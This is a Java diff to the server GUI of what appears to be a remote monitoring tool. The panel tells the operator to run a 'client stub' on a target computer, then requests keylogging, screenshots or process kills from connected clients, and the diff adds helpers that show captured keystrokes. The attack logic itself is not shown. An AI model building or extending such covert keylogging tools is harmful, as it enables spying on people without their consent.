@@ -67,14 +67,15 @@ public class ServerPanel extends JPanel implements ActionListener {
 		sidePanel = new SidePanel(new String[] {"Run the client stub on a target computer to connect!", 
 				"Once connected, right click on any entry in the list to the left to execute various functions",
 				"",
-				"Your internal server IP is " + InetAddress.getLocalHost().getHostAddress() + ", with hostname " + InetAddress.getLocalHost().getHostName(),});
+				"Your internal server IP is " + InetAddress.getLocalHost().getHostAddress() + ", with hostname " + InetAddress.getLocalHost().getHostName(),
+				});
 
 		// Sets up the various action listeners
 		// Right click mouse listener for the right click menu on the client list
 		clientList.addMouseListener(new MouseAdapter() {
 			public void mouseClicked(MouseEvent me) {
 
-				// if right mouse button clicked (or me.isPopupTrigger())
+				// If right mouse button is clicked and something's selected
 				if (SwingUtilities.isRightMouseButton(me) && !clientList.isSelectionEmpty())
 					popupMenu.show(clientList, me.getX(), me.getY());
 			}
@@ -91,13 +92,29 @@ public class ServerPanel extends JPanel implements ActionListener {
 		clientListScroll.setBounds(15, 15, LIST_WIDTH, LIST_HEIGHT);
 		clearDead.setBounds(15, 15 + LIST_HEIGHT, LIST_WIDTH, BUTTON_HEIGHT);
 		clearAll.setBounds(15, 15 + LIST_HEIGHT + BUTTON_HEIGHT, LIST_WIDTH, BUTTON_HEIGHT);
-		sidePanel.setBounds(LIST_WIDTH + 30, 15, ServerFrame.WINDOW_WIDTH - (45 + LIST_WIDTH), ServerFrame.WINDOW_HEIGHT - 15);
+		sidePanel.setBounds(LIST_WIDTH + 30, 15, ServerFrame.WINDOW_WIDTH - (55 + LIST_WIDTH), ServerFrame.WINDOW_HEIGHT - 15);
 		add(clientListScroll);
 		add(clearDead);
 		add(clearAll);
 		add(sidePanel);
 	}
-
+	
+	/**
+	 * Resets the side panel to an empty blank panel
+	 */
+	public void resetTextArea() {
+		remove(sidePanel);
+		sidePanel = new SidePanel(new String[0]);
+		sidePanel.setBounds(LIST_WIDTH + 30, 15, ServerFrame.WINDOW_WIDTH - (55 + LIST_WIDTH), ServerFrame.WINDOW_HEIGHT - 15);
+		add(sidePanel);
+		revalidate();
+		repaint();
+	}
+	
+	public void resetPictureArea() {
+		
+	}
+	
 	/**
 	 * Updates the list of connected clients
 	 */
@@ -116,15 +133,23 @@ public class ServerPanel extends JPanel implements ActionListener {
 
 		// Sends the appropriate request depending on what element of the popup the user selected
 		// Also I totally get that this is super lazy, but it works deliciously so whatever
-		if (e.getSource() == menuKeyl)
+		if (e.getSource() == menuKeyl) {
+			resetTextArea();
 			RemoteMonitorServer.requestOperation(clientList.getSelectedValue(), PacketHeader.KEYL);
-		else if (e.getSource() == menuPict)
+		} else if (e.getSource() == menuPict) {
+			resetPictureArea();
 			RemoteMonitorServer.requestOperation(clientList.getSelectedValue(), PacketHeader.PICT);
-		else if (e.getSource() == menuKill)
+		} else if (e.getSource() == menuKill)
 			RemoteMonitorServer.requestOperation(clientList.getSelectedValue(), PacketHeader.KILL);
 		else if (e.getSource() == clearDead)
 			RemoteMonitorServer.removeDeadConnections();
 		else if (e.getSource() == clearAll)
 			RemoteMonitorServer.removeAllConnections();
-	} 
+	}
+	
+	/**
+	 * Gets the side panel to add the text onto the text field if that exists
+	 * @param key Text to add onto the text area
+	 */
+	public void addText(String key) {sidePanel.addText(key);}
 }
